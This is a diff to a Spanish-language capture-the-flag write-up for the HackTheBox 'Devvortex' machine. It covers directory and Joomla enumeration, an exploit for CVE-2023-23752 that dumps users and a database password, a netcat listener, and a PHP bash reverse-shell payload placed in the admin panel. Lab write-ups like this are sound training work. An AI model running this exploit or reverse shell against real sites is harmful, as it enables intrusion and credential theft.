@@ -1,6 +1,6 @@
 # Devvortex - Easy
 
-IP = 10.10.11.242
+IP=10.10.11.242
 
 ```bash	
 echo "$IP devvortex.htb" | sudo tee -a /etc/hosts
@@ -51,4 +51,68 @@ echo "$IP dev.devvortex.htb" | sudo tee -a /etc/hosts
 
 ```bash
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://dev.devvortex.htb
+
+```
+
+> Se ha encontrado un panel de login en /administrator corriendo Joomla.
+
+### Buscar version en Joomla
+
+```bash
+joomscan -u http://dev.devvortex.htb
+```
+
+> La version es 4.2.6
+
+### Buscar exploits en searchsploit
+
+> He encontrado un exploit que permite hacer un bypass de la autenticacion. [https://github.com/Acceis/exploit-CVE-2023-23752](https://github.com/Acceis/exploit-CVE-2023-23752)
+
+### Ejecutar el exploit
+
+```bash
+gem install httpx docopt paint
+```
+
+```bash
+# Ejecutamos el exploit
+ruby exploit.rb http://dev.devvortex.htb
+```
+
+```text
+Users
+[649] lewis (lewis) - lewis@devvortex.htb - Super Users
+[650] logan paul (logan) - logan@devvortex.htb - Registered
+
+Site info
+Site name: Development
+Editor: tinymce
+Captcha: 0
+Access: 1
+Debug status: false
+
+Database info
+DB type: mysqli
+DB host: localhost
+DB user: lewis
+DB password: P4ntherg0t1n5r3c0n##
+DB name: joomla
+DB prefix: sd4fg_
+DB encryption 0
+```
+
+### Pones netcat a la escucha
+
+```bash
+nc -lvnp 4444
+```
+
+### Añadimos la reverse shell en el panel de administracion
+
+system('bash -c "bash -i >& /dev/tcp/10.10.14.216/4444 0>&1"');
+
+### Una vez dentro, nos conectamos a la base de datos
+    
+```bash
+mysql -u lewis -p
 ```
